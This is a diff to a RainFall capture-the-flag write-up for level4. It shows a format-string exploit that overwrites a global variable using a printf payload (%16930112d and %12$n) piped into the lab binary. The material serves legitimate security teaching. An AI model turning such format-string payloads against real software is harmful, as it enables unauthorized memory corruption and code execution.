@@ -1,4 +1,4 @@
-# Level 1
+# Level 4
 
 <h3>source.c</h3>
 
@@ -32,7 +32,7 @@ Target is to modify the `m` global variable to `16930116`
 
 <h3>Exploit</h3>
 
-The address of `m` is at `0x8049810`
+The address of `m` is at `0x08049810`
 
 Next we need to find which arg position of the `printf()` that we need to store the char counter on
 
@@ -43,11 +43,9 @@ aaaa [b7ff26b0]  [bffff744]  [b7fd0ff4]  [0]  [0]  [bffff708]  [804848d]  [bffff
 
 There we have it, the 12th position!
 
-Now we need to write `16930112` char since we already have the 4 bytes for the address of `m`, but it is too long and `printf()` will not accept it
+Now we need to write `16930112` char since we already have the 4 bytes for the address of `m`, but it is too long and `printf()` will have a hard time printing it
 
 We could use `%16930112d`, where `%d` is the modifier for digits and we can specify the field width by putting some numbers before it
-
-'\x10\x98\x04\x08'
 
 ```console
 level4@RainFall:~$ (python -c "print '\x10\x98\x04\x08' + '%16930112d' + '%12\$n'") | ./level4
